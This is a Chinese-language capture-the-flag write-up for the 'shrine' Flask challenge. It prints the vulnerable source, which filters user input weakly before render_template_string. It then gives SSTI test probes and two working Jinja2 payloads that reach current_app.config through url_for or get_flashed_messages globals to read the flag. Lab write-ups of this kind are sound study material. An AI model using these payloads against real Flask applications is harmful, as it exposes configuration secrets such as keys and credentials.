题目地址：https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5422&page=1

题目信息

进入环境会看到一堆代码，是无序的，但是查看页面源码就会得到整齐的代码： 

import flask
import os
app = flask.Flask(__name__)
app.config['FLAG'] = os.environ.pop('FLAG')
@app.route('/')
def index():
    return open(__file__).read()
@app.route('/shrine/<path:shrine>')
def shrine(shrine):
    def safe_jinja(s):
        s = s.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s
    return flask.render_template_string(safe_jinja(shrine))
if __name__ == '__main__':
    app.run(debug=True)

  • 第一，由app.config['FLAG'] = os.environ.pop('FLAG')，知道flag在app.config['FLAG']里；
  • 第二可以访问/shrine/xxx；
  • 第三，(, ), config, self被禁用，那么传统的模板注入就不行了。

查看是否存在SSTI：

1. shrine/${7*7} # 结果 ${7*7}
2. shrine/{{7*7}} # 结果 49
3. shrine/{{7*'7'}} # 结果 7777777

存在SSTI，并且模板引擎为Jinjia2或者flask。

解题

这里因为过滤了传统SSTI所必须的一些字符，因此得使用其他办法。又因为flag在环境变量中，考虑直接读取。

读取内容。 

1. {{url_for.__globals__['current_app'].config['FLAG']}}
2. {{get_flashed_messages.__globals__['current_app'].config['FLAG']}}
